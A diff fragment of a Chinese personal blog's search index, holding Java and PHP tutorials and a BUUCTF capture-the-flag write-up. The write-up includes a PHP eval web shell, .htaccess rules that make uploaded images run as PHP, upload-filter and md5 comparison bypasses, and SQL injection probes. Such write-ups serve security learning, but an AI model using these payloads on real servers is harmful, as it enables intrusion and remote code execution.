-                &#125;
-                System.out.println(&quot;t1线程finish&quot;);
-            &#125;
-        &#125;);
-        t1.start();
-        Thread t2 = new Thread(() -&gt; &#123;
-            synchronized (object2) &#123; // 针对object2对象进行加锁
-                System.out.println(&quot;t2线程start&quot;);
-                try &#123;
-                    Thread.sleep(1000);
-                &#125; catch (InterruptedException e) &#123;
-                    e.printStackTrace();
-                &#125;
-                System.out.println(&quot;t2线程finish&quot;);
-            &#125;
-        &#125;);
-        t2.start();
-    &#125;
-&#125;
-</code></pre>
-<p> 两个线程可以做到同时执行</p>
+<p>继承中子类的特点：</p>
+<p>子类可以有父类的内容，还可以有自己特有的内容</p>
+<h2 id="继承的好处和弊端"><a href="#继承的好处和弊端" class="headerlink" title="继承的好处和弊端"></a>继承的好处和弊端</h2><p><strong>继承好处</strong><br>提高了代码的复用性(多个类相同的成员可以放到同一个类中)<br>提高了代码的维护性(如果方法的代码需要修改，修改一处即可)<br><strong>继承弊端</strong><br>继承让类与类之间产生了关系，类的合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性<br><strong>什么时候使用继承?</strong><br>继承体现的关系:is a<br>假设法:我有两个类A和B，如果他们满足A是B的一种，或者B是A的一种，就说明他们存在继承关系，这个时候就可以考虑使用继承来体现，否则就不滥用继承</p>
+<h2 id="继承中变量的访问特点"><a href="#继承中变量的访问特点" class="headerlink" title="继承中变量的访问特点"></a>继承中变量的访问特点</h2><p>在子类方法中访问一个变量</p>
+<ol>
+<li>子类局部范围找</li>
+<li>子类成员范围找</li>
+<li>父类成员范围找</li>
+<li>如果都没有就报错(不考虑父亲的父亲…)</li>
+</ol>
+<h2 id="继承类型"><a href="#继承类型" class="headerlink" title="继承类型"></a>继承类型</h2><p>需要注意的是 Java 不支持多继承，但支持多重继承。</p>
+<p><img src="https://www.runoob.com/wp-content/uploads/2013/12/java-extends-2020-12-08.png" alt="img"></p>
+<h2 id="继承关键字"><a href="#继承关键字" class="headerlink" title="继承关键字"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承 Object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p>
+<h3 id="extends关键字"><a href="#extends关键字" class="headerlink" title="extends关键字"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p>
+<p>public class Animal {<br>    private String name;<br>    private int id;<br>    public Animal(String myName, int myid) {<br>        &#x2F;&#x2F;初始化属性值<br>    }<br>    public void eat() {  &#x2F;&#x2F;吃东西方法的具体实现  }<br>    public void sleep() { &#x2F;&#x2F;睡觉方法的具体实现  }<br>} </p>
+<p>public class Penguin  extends  Animal{<br>}</p>
+<h3 id="implements关键字"><a href="#implements关键字" class="headerlink" title="implements关键字"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有<code>多继承</code>的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p>
+<p>public interface A {<br>    public void eat();<br>    public void sleep();<br>}</p>
+<p>public interface B {<br>    public void show();<br>}</p>
+<p>public class C implements A,B {<br>}</p>
+<h3 id="super-与-this-关键字"><a href="#super-与-this-关键字" class="headerlink" title="super 与 this 关键字"></a>super 与 this 关键字</h3><p>super关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>
+<p>this关键字：指向自己的引用。</p>
+<p><strong>实例</strong></p>
+<p>class Animal {<br>  void eat() {<br>    System.out.println(“animal : eat”);<br>  }<br>}</p>
+<p>class Dog extends Animal {<br>  void eat() {<br>    System.out.println(“dog : eat”);<br>  }<br>  void eatTest() {<br>    this.eat();   &#x2F;&#x2F; this 调用自己的方法<br>    super.eat();  &#x2F;&#x2F; super 调用父类方法<br>  }<br>}</p>
+<p>public class Test {<br>  public static void main(String[] args) {<br>    Animal a &#x3D; new Animal();<br>    a.eat();<br>    Dog d &#x3D; new Dog();<br>    d.eatTest();<br>  }<br>}</p>
+<p>输出结果为：</p>
+<p>animal : eat<br>dog : eat<br>animal : eat</p>
+<h3 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h3><p>final 可以用来修饰变量（包括类属性、对象属性、局部变量和形参）、方法（包括类方法和对象方法）和类。</p>
+<p><strong>final修饰的特点</strong></p>
+<ul>
+<li>修饰方法:表明该方法是最终方法，不能被重写</li>
+<li>修饰变量:表明该变量是常量，不能再次被赋值</li>
+<li>修饰类:表明该类是最终类，不能被继承</li>
+</ul>
+<p>声明类：</p>
+<p>final class 类名 {&#x2F;&#x2F;类体}</p>
+<p>声明方法：</p>
+<p>修饰符(public&#x2F;private&#x2F;default&#x2F;protected) final 返回值类型 方法名(){&#x2F;&#x2F;方法体}</p>
+<p><strong>注：</strong> final 定义的类，其中的属性、方法不是 final 的。</p>
+<p><strong>final修饰局部变量</strong></p>
+<p>变量是基本类型: final修饰指的是基本类型的数据值不能发生改变</p>
+<p>变量是引用类型: final修饰指的是引用类型的地址值不能发生改变，但是地址里面的内容是可以发生改变的</p>
+<h1 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h1><p>static 关键字是静态的意思，可以修饰成员方法，成员变量<br><strong>static 修饰的特点</strong></p>
+<ul>
+<li>被类的所有对象共享<br>这也是我们判断是否使用静态关键字的条件</li>
+<li>推荐使用类名调用</li>
+</ul>
+<p><strong>static 访问特点</strong></p>
+<p>静态成员方法只能访问静态成员和静态成员方法</p>
+<h1 id="Java-包"><a href="#Java-包" class="headerlink" title="Java 包"></a>Java 包</h1><p>包主要用来对类和接口进行分类管理</p>
+<p>包的定义格式</p>
+<p>格式：package 包名；</p>
+<p>范例：package com.first;</p>
+<h2 id="import-语句-导包"><a href="#import-语句-导包" class="headerlink" title="import 语句(导包)"></a>import 语句(导包)</h2><p>在 Java 中，如果给出一个完整的限定名，包括包名、类名，那么 Java 编译器就可以很容易地定位到源代码或者类。import 语句就是用来提供一个合理的路径，使得编译器可以找到某个类。</p>
+<p>例如，下面的命令行将会命令编译器载入 java_installation&#x2F;java&#x2F;io 路径下的所有类</p>
+<p>import java.io.*;(import 包名)</p>
 ]]></content>
       <tags>
         <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP</title>
-    <url>/2023/08/09/PHP/</url>
-    <content><![CDATA[<h2 id="基本的-PHP-语法"><a href="#基本的-PHP-语法" class="headerlink" title="基本的 PHP 语法"></a>基本的 PHP 语法</h2><span id="more"></span>
-
-<p>PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束：</p>
-<?php
- // PHP 代码
- ?>
-
-<p>PHP 文件的默认文件扩展名是 “.php”。</p>
-<p>PHP echo 和 print 语句</p>
-<p>echo 和 print 区别:</p>
-<ul>
-<li>echo - 可以输出一个或多个字符串</li>
-<li>print - 只允许输出一个字符串，返回值总为 1</li>
-</ul>
-<p> goto循环语句</p>
-<pre><code>王同学每周往返,但有一个特例:项目失败后或者集团临时通知除外,就可以不再这么每周往返了.
-</code></pre>
-<p>基本语法:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">goto wan;</span><br><span class="line">echo &#x27;天王盖地虎&#x27;;</span><br><span class="line">wan:</span><br><span class="line">echo &#x27;小鸡炖蘑菇&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>基本编写:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=0;$i&lt;100;$i++)&#123;</span><br><span class="line">    echo &#x27;第&#x27;.$i.&#x27;每周往返北京大连&lt;br /&gt;&#x27;;</span><br><span class="line">    if($i == 17)&#123;</span><br><span class="line">        goto end;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">end:</span><br><span class="line">echo &#x27;停止此项&#x27;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="PHP文件系统管理"><a href="#PHP文件系统管理" class="headerlink" title="PHP文件系统管理"></a>PHP文件系统管理</h3><p>(1)fopen、fread、fclose操作读取文件</p>
-<p>1.readfile读取文件函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile ( string: $文件名)</span><br><span class="line">功能：传入一个文件路径，输出一个文件。</span><br></pre></td></tr></table></figure>
-
-<p>下面的这一段代码中，只要传入文件名或者指定的文件路径就把文件读取出来了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //linux类的读了方式</span><br><span class="line">   readfile(&quot;/home/paul/test.txt&quot;);</span><br><span class="line">   //windows类的读取方式</span><br><span class="line">   readfile(&quot;c:\oldboyoldboyoot.ini&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">注意：上面的代码中windows的斜线是斜线，可能会转义掉一些字符。因此，我们写的时候写上两个斜线。</span><br></pre></td></tr></table></figure>
-
-<p>2、file_get_contents打开文件函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;NoAlike.txt&#x27;;</span><br><span class="line">   $filestring = file_get_contents($filename);</span><br><span class="line">   echo $filestring;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>3、fopen、fread、fclose操作读取文件</p>
-<p>上面file_get_contents打开文件的方式简单、粗暴。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource fopen	 	    ( string $文件名, string 模式)</span><br><span class="line">string fread 			( resource $操作资源, int 读取长度)</span><br><span class="line">bool fclose 			( resource $操作资源 )</span><br></pre></td></tr></table></figure>
-
-<p>fopen的模式有下面几个</p>
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230809110222323.png" alt="image-20230809110222323"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //你可以创建一个NoAlike.txt，以只读模式打开</span><br><span class="line">   $fp = fopen(&#x27;NoAlike.txt&#x27;, &quot;r&quot;);</span><br><span class="line">   //var_dump()操作一下$fp看看效果，输出的是不是只有类型提示的是resource</span><br><span class="line">   var_dump($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(2)PHP创建和修改文件内容</p>
-<p>1、file_put_contents写入文件</p>
-<p>第一种写入文件的方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents ( string $文件路径, string $写入数据)</span><br><span class="line">功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</span><br></pre></td></tr></table></figure>
-
-<p>操作代码演示示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $data = &quot;在PHP中文网学好PHP，不再话下！&quot;;</span><br><span class="line">   $numbytes = file_put_contents(&#x27;test.txt&#x27;, $data);</span><br><span class="line">   if($numbytes)&#123;</span><br><span class="line">       echo &#x27;写入成功，我们读取看看结果试试：&#x27;;</span><br><span class="line">       echo file_get_contents(&#x27;test.txt&#x27;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">       echo &#x27;写入失败或者没有权限，注意检查&#x27;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2、fwrite配合fopen进行写入操作</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   $fp= fopen($filename, &quot;w&quot;);</span><br><span class="line">   $len = fwrite($fp, &#x27;我是一只来自北方的狼，却在南方冻成了狗&#x27;);</span><br><span class="line">   fclose($fp);</span><br><span class="line">   print $len .&#x27;字节被写入了</span><br><span class="line">&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>代码说明：<br>· 不论有没有新建都会打开文件重新写入<br>· 原有的文件内容会被覆盖掉<br>· 文件不存在会创建</p>
-<p>(3) PHP创建临时文件</p>
-<pre><code>我们之前创建的文件都是永久文件，而创建临时文件在我们平时的项目开发中也非常有用，创建临时文件的好处：文件操作完成后即删除，不需要去维护这个文件的删除状态。
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //创建了一个临时文件</span><br><span class="line">   $handle = tmpfile();</span><br><span class="line">   //向里面写入了数据</span><br><span class="line">   $numbytes = fwrite($handle, &#x27;写入临时文件&#x27;);</span><br><span class="line">   //关闭临时文件，文件即被删除</span><br><span class="line">   fclose($handle);</span><br><span class="line">   echo  &#x27;向临时文件中写入了&#x27;.$numbytes . &#x27;个字节&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(4) php移动、拷贝和删除文件</p>
-<p>我们日常在处理文件的时候，可以删除文件、重命名文件也可以也可复制文件。</p>
-<p>1、重命名文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename($旧名,$新名);</span><br><span class="line">功能：这个函数返回一个bool值，将旧的名字改为新的名字。</span><br></pre></td></tr></table></figure>
-
-<p>操作示例说明：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //旧文件名</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   //新文件名</span><br><span class="line">   $filename2 = $filename . &#x27;.old&#x27;;</span><br><span class="line">   //复制文件</span><br><span class="line">   rename($filename, $filename2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2、复制文件<br>复制文件，就相当于是克隆技术，将一个原来的东西再克隆成一个新的东西，两个长得一模一样。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy(源文件,目标文件)</span><br><span class="line">功能：将指定路径的源文件，复制一份到目标文件的位置。</span><br></pre></td></tr></table></figure>
-
-<p>操作示例说明：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //旧文件名</span><br><span class="line">   $filename = &#x27;copy.txt&#x27;;</span><br><span class="line">   //新文件名</span><br><span class="line">   $filename2 = $filename . &#x27;_backup&#x27;;</span><br><span class="line">   //修改名字。</span><br><span class="line">   copy($filename, $filename2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-<p>说明：会通过上面的例子，发现多出来了一个文件。</p>
-<p>3、删除文件</p>
-<p>删除文件就是将指定路径的一个文件删除，不过这个删除是直接删除。使用的是windows电脑，你在回收站看不到这个文件，你只会发现这个文件消失了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unlink(指定路径的文件)</span><br></pre></td></tr></table></figure>
-
-<p>代码操作示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   if (unlink($filename)) &#123;</span><br><span class="line">       echo  &quot;删除文件成功 $filename!</span><br><span class="line">&quot;;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo  &quot;删除 $filename 失败!</span><br><span class="line">&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>4、检测文件属性函数</p>
-<p>假设安装界面的网址是：install.php，安装的锁文件是install.lock。我们就可以检测install.lock文件是否存在。</p>
-<pre><code>&lt;?php
-if(file_exists(&#39;install.lock&#39;))&#123;
-   echo &#39;已安装，请不要再次进行安装&#39;;
-   exit;
-&#125;
-?&gt;
-</code></pre>
-<p>5、PHP目录处理函数</p>
-<p>php 目录处理函数处理文件夹的基本思想如下：<br>1.读取某个路径的时候判断是否是文件夹<br>2.是文件夹的话，打开指定文件夹，返回文件目录的资源变量<br>3.使用readdir读取一次目录中的文件，目录指针向后偏移一次<br>4.使用readdir读取到最后，没有可读的文件返回false<br>5.关闭文件目录<br><strong>代码演示操作</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//设置打开的目录是D盘</span><br><span class="line">$dir = &quot;d:/&quot;;</span><br><span class="line">//判断是否是文件夹，是文件夹</span><br><span class="line">if (is_dir($dir)) &#123;</span><br><span class="line">   if ($dh = opendir($dir)) &#123;</span><br><span class="line">      //读取到最后返回false，停止循环</span><br><span class="line">      while (($file = readdir($dh)) !== false) &#123;</span><br><span class="line">           echo &quot;文件名为: $file : 文件的类型是: &quot; . filetype($dir . $file) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">       closedir($dh);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>6、php 文件权限设置<br>chmod主要是修改文件的的权限</p>
-<pre><code>&lt;?php
-//修改linux系统/var/wwwroot/某文件权限为755
-chmod(&quot;/var/wwwroot/index.html&quot;, 755);  
-chmod(&quot;/var/wwwroot/index.html&quot;, &quot;u+rwx,go+rx&quot;); 
-chmod(&quot;/somedir/somefile&quot;, 0755); 
-?&gt;
-</code></pre>
-<p>7、php文件路径函数</p>
-<p>我们经常会遇到处理文件路径的情况。例如：<br>1.文件后缀需要取出来<br>2.路径需要取出名字不取目录<br>3.只需要取出路径名中的目录路径<br>4.或者把网址中的各个部份进行解析取得独立值<br>5.甚至是自己组成一个url出来</p>
-<p>很多地方都需要用路径处理类的函数。把常用的路径处理函数为大家做了标注，对着这个路径处理函数进行处理即可：在这里插入图片描述</p>
-<p>代码示例说明：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path_parts = pathinfo(&#x27;d:/www/index.inc.php&#x27;);</span><br><span class="line">echo &#x27;文件目录名：&#x27;.$path_parts[&#x27;dirname&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;文件全名：&#x27;.$path_parts[&#x27;basename&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;文件扩展名：&#x27;.$path_parts[&#x27;extension&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;不包含扩展的文件名：&#x27;.$path_parts[&#x27;filename&#x27;].&quot;&lt;br /&gt;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>8、php实现文件留言本</p>
-<p>我们来看一下文件结构：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php		展示输入框和留言内容</span><br><span class="line">write.php 		向message.txt写入数据</span><br><span class="line">message.txt 		存入聊天内容</span><br></pre></td></tr></table></figure>
-
-<p>编写index.php文件信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//设置时区</span><br><span class="line">date_default_timezone_set(&#x27;PRC&#x27;);</span><br><span class="line">//读了内容</span><br><span class="line">@$string = file_get_contents(&#x27;message.txt&#x27;);</span><br><span class="line">//如果$string 不为空的时候执行，也就是message.txt中有留言数据</span><br><span class="line">if (!empty($string)) &#123;</span><br><span class="line">    //每一段留言有一个分格符，但是最后多出了一个&amp;^。因此，我们要将&amp;^删掉</span><br><span class="line">    $string = rtrim($string, &#x27;&amp;^&#x27;);</span><br><span class="line">    //以&amp;^切成数组</span><br><span class="line">    $arr = explode(&#x27;&amp;^&#x27;, $string);</span><br><span class="line">    //将留言内容读取</span><br><span class="line">    foreach ($arr as $value) &#123;</span><br><span class="line">        //将用户名和内容分开</span><br><span class="line">        list($username, $content, $time) = explode(&#x27;$#&#x27;, $value);</span><br><span class="line">        echo &#x27;用户名为&lt;font color=&quot;gree&quot;&gt;&#x27; . $username . &#x27;&lt;/font&gt;内容为&lt;font color=&quot;red&quot;&gt;&#x27; . $content . &#x27;&lt;/font&gt;时间为&#x27; . date(&#x27;Y-m-d H:i:s&#x27;, $time);</span><br><span class="line">        echo &#x27;&lt;hr /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h1&gt;基于文件的留言本演示&lt;/h1&gt;</span><br><span class="line">&lt;form action=&quot;write.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;</span><br><span class="line">    留言内容：&lt;textarea  name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>看了刚刚的展示内容，我们知道文件存储时：<br>1、段与段之间进行了分割<br>2、内容与用户之前用一个特殊的符号进行了分割</p>
-<p>下面我们来写write.php写入留言至文件的代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//追加方式打开文件</span><br><span class="line">$fp=fopen(&#x27;message.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">//设置时间</span><br><span class="line">$time=time();</span><br><span class="line">//得到用户名</span><br><span class="line">$username=trim($_POST[&#x27;username&#x27;]);</span><br><span class="line">//得到内容</span><br><span class="line">$content=trim($_POST[&#x27;content&#x27;]);</span><br><span class="line">//组合写入的字符串：内容和用户之间分开，使用$#</span><br><span class="line">//行与行之间分开，使用&amp;^</span><br><span class="line">$string=$username.&#x27;$#&#x27;.$content.&#x27;$#&#x27;.$time.&#x27;&amp;^&#x27;;</span><br><span class="line">//写入文件</span><br><span class="line">fwrite($fp,$string);</span><br><span class="line">//关闭文件</span><br><span class="line">fclose($fp);</span><br><span class="line">header(&#x27;location:index.php&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>参考文章：<br> <a href="https://www.runoob.com/php/php-tutorial.html">PHP 教程</a></p>
-]]></content>
-      <tags>
-        <tag>语言</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuctf</title>
-    <url>/2023/08/08/buuctf/</url>
-    <content><![CDATA[<h1 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h1><span id="more"></span>
-
-<p>1、后缀名不能有ph！对于文件后缀名的限制，无法绕过这里<br>2、上传类型也太露骨了吧！对Content-Type的限制，修改为image&#x2F;jpeg即可绕过<br>3、诶，别蒙我啊，这标志明显还是php啊</p>
-<p>对上传文件的内容进行了检测，不能含有&lt;?，这里的PHP版本为：PHP&#x2F;5.6.23，可以使用 绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;111&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>但是搭建到蚁剑上连接不成功</p>
-<p>上传一个.htaccess文件将别的后缀名文件内容解析为php程序</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .mochu</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165204744.png" alt="image-20230805165204744"></p>
-<p>然后上传shell即可</p>
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165102425.png" alt="image-20230805165102425"></p>
-<p>用蚁剑创建数据</p>
-<p>找到根目录下的flag</p>
-<p>![屏幕截图 2023-08-05 150602](D:\Users\陈\Pictures\Screenshots\屏幕截图 2023-08-05 150602.png)</p>
-<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开靶机是一串代码<br>因为html 渲染过程中是不会把\n当做回车展示的，所以右键查看源代码，瞬间舒服了：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
-
-<p>按行显示的题目代码“代码审计”<br>读代码可知拿到flag只需要满足俩条件：<br>1.让以get方式传参的两个变量gg和id满足md5后的值强比较相等，本身的值弱比较不相等<br>2.以post方式传参的变量password不是数字并且与数字1234567弱比较相等<br>由此，在url后追加?id[]&#x3D;1&amp;gg[]&#x3D;2就可以显示“You got the first step”的提示。但passwd参数还没有传，此时需要借助浏览器插件HackBar以post方式传入passwd&#x3D;1234567a<br>以get方式传参并使md5值相等<br>总结：<br>1.给数组类型的变量赋值不同的数值，可以满足变量的md5值在进行强比较时相等，又满足他们自身的值在进行弱比较时不相等。<br>2.在数字后面加个字母，就不再是数字但又可以满足和数字做弱比较时相等。</p>
-<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>这题目的名字一看就能猜到应该是文件上传了<br>打开靶机链接是这个样子的，我不知道这是什么梗<br>题目网页<br>因为类似的题上一篇已经写过了，这里就简写。这道题也是只能上传非php后缀的文件，然后再上传.htaccess文件，使服务器端将jpg看做php。<br>上传jpg格式的一句话木马：<br>一句话木马</p>
-<p>上传.htaccess时拦截包，修改文件类型为image&#x2F;jpeg：<br>上传.htaccess文件<br>.htaccess里写的内容：SetHandler application&#x2F;x-httpd-php</p>
-<p>上传1.jpg和.htaccess成功后，就可以用中国蚁剑连接了<br>url地址是：靶机的url&#x2F;upload&#x2F;随机生成的一串数&#x2F;1.jpg（即一句话木马文件上传到的路径）<br>密码是写在1.jpg里的111<br>测试连接，显示连接成功，点击添加，在服务器端的根目录可以找到flag</p>
-<h2 id="htaccess是什么"><a href="#htaccess是什么" class="headerlink" title="htaccess是什么"></a>htaccess是什么</h2><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
-<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config</p>
-<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
-<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>访问url</p>
-<p>重命名+堆叠注入</p>
-<p>1.判断是否存在注入，注入是字符型还是数字型</p>
-<p>输入1’发现不回显</p>
-<p>输入1’#显示正常</p>
-<p>应该是存在sql注入了</p>
-<p>输入1’ or ‘1’&#x3D;’1,正常回显，应该是字符型</p>
